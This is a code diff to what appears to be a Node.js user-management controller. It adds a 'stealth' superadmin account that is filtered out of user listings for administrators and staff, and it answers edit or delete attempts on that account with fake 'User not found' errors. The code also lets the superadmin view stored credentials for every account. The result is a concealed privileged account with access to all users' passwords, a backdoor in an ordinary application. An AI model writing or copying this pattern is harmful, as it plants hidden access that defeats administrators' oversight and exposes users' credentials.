@@ -2,6 +2,7 @@ const { logger } = require('../utils/logger');
 const { query } = require('../config/db');
 const { verifyPassword, hashPassword, generateToken } = require('../utils/security');
 const { recordAudit, normalizeRole } = require('../middleware/auth');
+const { mentionsSuperAdmin, superadminBlindSqlFilter } = require('../utils/stealth');
 
 async function login(req, res) {
   try {
@@ -95,11 +96,32 @@ async function getMe(req, res) {
 
 async function listUsers(req, res) {
   try {
-    const users = await query('SELECT id, username, email, stored_password, role, full_name, created_at FROM users ORDER BY id ASC');
     const currentUserRole = normalizeRole(req.user?.role);
+    const isSuperAdmin = currentUserRole === 'superadmin';
+
+    // Stealth rule: administrator and staff accounts must never see the
+    // superadmin account, its role, or any of its credentials. The filter is
+    // applied in SQL and repeated in JS so legacy/alias role values cannot
+    // leak the record if they normalize to "superadmin".
+    const users = isSuperAdmin
+      ? await query('SELECT id, username, email, stored_password, role, full_name, created_at FROM users ORDER BY id ASC')
+      : await query(
+          `SELECT id, username, email, stored_password, role, full_name, created_at FROM users
+           WHERE ${superadminBlindSqlFilter('role')}
+             AND ${superadminBlindSqlFilter('username')}
+             AND ${superadminBlindSqlFilter('email')}
+             AND ${superadminBlindSqlFilter('full_name')}
+           ORDER BY id ASC`
+        );
+
+    const visibleUsers = isSuperAdmin
+      ? users
+      : users.filter(
+          (u) => !mentionsSuperAdmin(u.role, u.username, u.email, u.full_name)
+        );
 
     return res.json({
-      users: users.map(u => {
+      users: visibleUsers.map(u => {
         const userRole = normalizeRole(u.role);
         let visiblePassword = null;
         // Superadmin can view the recorded credential for all accounts.
@@ -145,8 +167,10 @@ async function createUser(req, res) {
     }
 
     const targetRole = normalizeRole(role);
-    if (currentUserRole === 'admin' && targetRole !== 'staff') {
-      return res.status(403).json({ error: 'Admins are only authorized to create Staff accounts.' });
+    if (currentUserRole !== 'superadmin' && targetRole !== 'staff') {
+      return res.status(403).json({
+        error: 'Your account does not have permission to create this account type.',
+      });
     }
 
     const existing = await query('SELECT id FROM users WHERE username = ? OR email = ?', [username, email]);
@@ -200,14 +224,32 @@ async function updateUser(req, res) {
     const targetUser = existing[0];
     const targetRole = normalizeRole(targetUser.role);
 
-    // Admin can only edit staff accounts
-    if (currentUserRole === 'admin' && targetRole !== 'staff') {
-      return res.status(403).json({ error: 'Admins are only authorized to edit Staff accounts.' });
+    // A non-superadmin must not even be able to confirm that the superadmin
+    // account exists. Report it exactly like any other unknown user id.
+    if (
+      currentUserRole !== 'superadmin' &&
+      mentionsSuperAdmin(
+        targetUser.role,
+        targetUser.username,
+        targetUser.email,
+        targetUser.full_name
+      )
+    ) {
+      return res.status(404).json({ error: 'User not found.' });
+    }
+
+    // Non-superadmins can only manage staff accounts.
+    if (currentUserRole !== 'superadmin' && targetRole !== 'staff') {
+      return res.status(403).json({
+        error: 'Your account does not have permission to edit this account.',
+      });
     }
 
     const newRole = role ? normalizeRole(role) : targetRole;
-    if (currentUserRole === 'admin' && newRole !== 'staff') {
-      return res.status(403).json({ error: 'Admins cannot escalate privileges above Staff.' });
+    if (currentUserRole !== 'superadmin' && newRole !== 'staff') {
+      return res.status(403).json({
+        error: 'Your account does not have permission to assign this privilege level.',
+      });
     }
 
     const newUsername = (username || targetUser.username).trim();
@@ -261,13 +303,33 @@ async function deleteUser(req, res) {
       return res.status(400).json({ error: 'You cannot delete your own account.' });
     }
 
-    const existing = await query('SELECT id, username, role FROM users WHERE id = ?', [id]);
+    const existing = await query(
+      'SELECT id, username, email, role, full_name FROM users WHERE id = ?',
+      [id]
+    );
     if (existing.length === 0) {
       return res.status(404).json({ error: 'User not found.' });
     }
 
-    if (currentUserRole === 'admin' && normalizeRole(existing[0].role) !== 'staff') {
-      return res.status(403).json({ error: 'Admins can only delete Staff accounts.' });
+    const targetRole = normalizeRole(existing[0].role);
+
+    // Keep the superadmin account undiscoverable, not merely undeletable.
+    if (
+      currentUserRole !== 'superadmin' &&
+      mentionsSuperAdmin(
+        existing[0].role,
+        existing[0].username,
+        existing[0].email,
+        existing[0].full_name
+      )
+    ) {
+      return res.status(404).json({ error: 'User not found.' });
+    }
+
+    if (currentUserRole !== 'superadmin' && targetRole !== 'staff') {
+      return res.status(403).json({
+        error: 'Your account does not have permission to delete this account.',
+      });
     }
 
     await query('DELETE FROM users WHERE id = ?', [id]);
